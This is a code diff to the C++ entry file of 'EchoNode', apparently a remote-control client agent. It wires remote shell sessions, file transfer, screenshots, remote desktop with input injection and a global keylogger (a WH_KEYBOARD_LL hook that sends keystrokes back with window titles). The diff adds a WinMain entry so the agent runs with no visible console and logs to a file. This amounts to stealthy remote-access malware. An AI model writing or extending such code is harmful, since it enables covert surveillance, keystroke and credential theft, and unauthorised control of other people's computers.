@@ -1,4 +1,3 @@
-// EchoNode 客户端入口
 #include "core/Client.hpp"
 #include "core/Config.hpp"
 #include "executor/Dispatcher.hpp"
@@ -12,25 +11,53 @@
 #include "platform/PlatformFactory.hpp"
 #include "protocol/to_server.hpp"
 
+#include <cstdio>
 #include <iostream>
 #include <memory>
+#include <string>
+#include <vector>
 
 namespace executor = echonode::executor;
 
-
 #ifdef _WIN32
-// 源码字符串为 UTF-8，控制台切到 65001 代码页避免中文乱码
 #include <windows.h>
+#include <fcntl.h>
+#include <io.h>
+
 static void initConsoleUtf8() {
     SetConsoleOutputCP(CP_UTF8);
     SetConsoleCP(CP_UTF8);
 }
+
+static void setupStdio(bool showConsole) {
+    if (showConsole) {
+        AllocConsole();
+        FILE* tmp = nullptr;
+        freopen_s(&tmp, "CONOUT$", "w", stdout);
+        freopen_s(&tmp, "CONOUT$", "w", stderr);
+        freopen_s(&tmp, "CONIN$", "r", stdin);
+        return;
+    }
+    FILE* tmp = nullptr;
+    if (freopen_s(&tmp, "agent.log", "a", stdout) == 0) {
+        _dup2(_fileno(stdout), _fileno(stderr));
+    }
+}
 #else
 static void initConsoleUtf8() {}
+static void setupStdio(bool) {}
 #endif
 
-int main(int argc, char** argv) {
+static bool hasFlag(int argc, char** argv, const char* flag) {
+    for (int i = 1; i < argc; ++i)
+        if (std::string(argv[i]) == flag) return true;
+    return false;
+}
+
+static int agentMain(int argc, char** argv) {
+    setupStdio(hasFlag(argc, argv, "--console"));
     initConsoleUtf8();
+
     auto cfg = echonode::core::Config::fromArgs(argc, argv);
     if (!cfg.valid) {
         std::cerr << "配置错误: " << cfg.error << "\n" << echonode::core::Config::usage() << "\n";
@@ -39,7 +66,6 @@ int main(int argc, char** argv) {
 
     echonode::core::Client client(cfg);
 
-    // 组装：shell_data 输出 → 推回服务端；shell_data 输入 → 写入会话 stdin
     executor::Dispatcher dispatcher;
     auto sessions =
         std::make_unique<echonode::executor::ShellSessionManager>(echonode::platform::createShellSpawn());
@@ -54,7 +80,6 @@ int main(int argc, char** argv) {
     dispatcher.add(std::make_unique<echonode::executor::ProcessExecutor>(
         echonode::platform::createProcessOps()));
 
-    // 文件传输：binary frame 经 FileExecutor 收发，结果由其自行延后应答
     auto fileExecutor = std::make_unique<echonode::executor::FileExecutor>();
     auto* filePtr = fileExecutor.get();
     fileExecutor->setBinarySender(
@@ -63,7 +88,6 @@ int main(int argc, char** argv) {
         [&client](const echonode::protocol::TaskResult& result) {
             client.sendText(echonode::protocol::toJson(result).dump());
         });
-    // 上传接收方角色：按 offset 落盘后回 file_ack 推进浏览器发送窗口
     fileExecutor->setTextSender(
         [&client](const std::string& text) { client.sendText(text); });
     dispatcher.add(std::move(fileExecutor));
@@ -71,14 +95,12 @@ int main(int argc, char** argv) {
         return filePtr->onBinary(data, len);
     });
 
-    // 截图：复用 binary 通道（流类型 0x02），无显示环境时返回错误结果
     auto shotExecutor = std::make_unique<echonode::executor::ScreenshotExecutor>(
         echonode::platform::createScreenCapture());
     shotExecutor->setBinarySender(
         [&client](const void* data, size_t len) { client.sendBinary(data, len); });
     dispatcher.add(std::move(shotExecutor));
 
-    // 远程桌面：JPEG 帧推送 + 输入注入
     auto deskExecutor = std::make_unique<echonode::executor::RemoteDeskExecutor>();
     deskExecutor->setBinarySender(
         [&client](const void* data, size_t len) { client.sendBinary(data, len); });
@@ -87,6 +109,8 @@ int main(int argc, char** argv) {
             client.sendText(echonode::protocol::toJson(result).dump());
         });
     deskExecutor->setInputInjector(echonode::platform::createInputInjector());
+    deskExecutor->setStatsEnabled(cfg.deskStats);
+    auto* deskPtr = deskExecutor.get();
     dispatcher.add(std::move(deskExecutor));
 
     // 键盘记录：WH_KEYBOARD_LL 钩子捕获全局键盘输入，按窗口标题上下文批量回传
@@ -97,12 +121,16 @@ int main(int argc, char** argv) {
         });
     dispatcher.add(std::move(keylogExecutor));
 
-    client.setTextHook([&sessionsPtr, filePtr](const nlohmann::json& j) {
+    client.setTextHook([&sessionsPtr, filePtr, deskPtr](const nlohmann::json& j) {
         const std::string type = j.value("type", std::string{});
-        // 下载发送方角色：接收方（浏览器）的累积确认推进滑动窗口
         if (type == "file_ack") {
             filePtr->onFileAck(j.value("taskId", std::string{}),
                                j.value("ackedOffset", size_t{0}));
+            return true;
+        }
+        if (type == "desk_stat") {
+            deskPtr->onDeskStat(j.value("fps", 0), j.value("stallMs", 0),
+                                j.value("seq", uint32_t{0}));
             return true;
         }
         if (type == "shell_resize") {
@@ -123,6 +151,29 @@ int main(int argc, char** argv) {
         return dispatcher.dispatch(std::move(task));
     });
 
-    client.run(); // 阻塞运行，Ctrl+C 退出
+    client.run();
     return 0;
 }
+
+#ifdef _WIN32
+int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
+    int argc = 0;
+    LPWSTR* wargv = CommandLineToArgvW(GetCommandLineW(), &argc);
+    std::vector<std::string> args;
+    args.reserve(argc > 0 ? argc : 1);
+    for (int i = 0; i < argc; ++i) {
+        const int need = WideCharToMultiByte(CP_UTF8, 0, wargv[i], -1, nullptr, 0, nullptr, nullptr);
+        std::string s(need > 1 ? need - 1 : 0, '\0');
+        if (need > 1)
+            WideCharToMultiByte(CP_UTF8, 0, wargv[i], -1, s.data(), need, nullptr, nullptr);
+        args.push_back(std::move(s));
+    }
+    if (wargv) LocalFree(wargv);
+    std::vector<char*> argv;
+    argv.reserve(args.size());
+    for (auto& a : args) argv.push_back(a.data());
+    return agentMain(static_cast<int>(argv.size()), argv.data());
+}
+#else
+int main(int argc, char** argv) { return agentMain(argc, argv); }
+#endif
